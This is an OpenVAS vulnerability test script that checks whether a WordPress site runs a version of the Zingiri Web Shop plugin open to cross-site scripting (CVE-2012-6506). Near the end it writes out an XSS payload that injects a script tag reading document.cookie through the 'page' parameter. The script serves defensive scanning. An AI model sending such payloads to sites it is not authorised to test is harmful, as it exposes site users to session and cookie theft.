##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_zingiri_web_shop_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress Zingiri Web Shop Plugin Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "WordPress Zingiri Web Shop Plugin Version 2.4.0 and prior";
tag_insight = "Multiple flaws are due to improper validation of user-supplied input
  passed to 'page' and 'notes' parameters, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.";
tag_solution = "Upgrade to WordPress Zingiri Web Shop Plugin 2.4.1 or later,
  For updates refer to http://wordpress.org/extend/plugins/zingiri-web-shop/";
tag_summary = "This host is running WordPress Zingiri Web Shop Plugin and is prone
  to multiple cross site scripting vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902831";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-6506");
  script_bugtraq_id(53278);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-27 14:14:14 +0530 (Fri, 27 Apr 2012)");
  script_name("WordPress Zingiri Web Shop Plugin Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploits/18135");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18787");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112216/WordPress-Zingiri-Web-Shop-2.4.0-Cross-Site-Scripting.html");

  script_description(desc);
  script_summary("Check if WordPress Zingiri Web Shop Plugin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);


## Construct the Attack Request
url = dir + '/?page="><script>alert(document.cookie)</script>';

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>",
       extra_check:"Zingiri Web Shop")){
  security_warning(port);
}
